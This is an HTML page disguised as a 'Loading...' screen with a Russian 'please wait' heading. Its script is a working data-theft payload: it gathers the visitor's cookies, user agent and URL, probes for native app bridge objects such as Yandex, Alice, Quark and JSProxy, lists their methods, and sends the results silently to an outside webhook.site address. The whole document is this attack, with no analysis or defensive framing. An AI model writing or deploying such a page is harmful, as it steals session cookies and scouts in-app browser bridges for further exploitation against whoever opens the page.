<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <script>
        (function() {
            var leak = {
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                url: window.location.href,
                interfaces: []
            };

            // Список возможных мостов, которые мы нашли в коде
            var targets = ['Quark', 'QuarkVisual', 'Yandex', 'YandexApp', 'Alice', 'JSProxy'];
            targets.forEach(function(name) {
                if (window[name]) {
                    leak.interfaces.push({
                        name: name,
                        methods: Object.keys(window[name])
                    });
                }
            });

            // Отправка данных на ваш Webhook
            fetch('https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(leak)
            });
        })();
    </script>
    <h1>Пожалуйста, подождите...</h1>
</body>
</html>
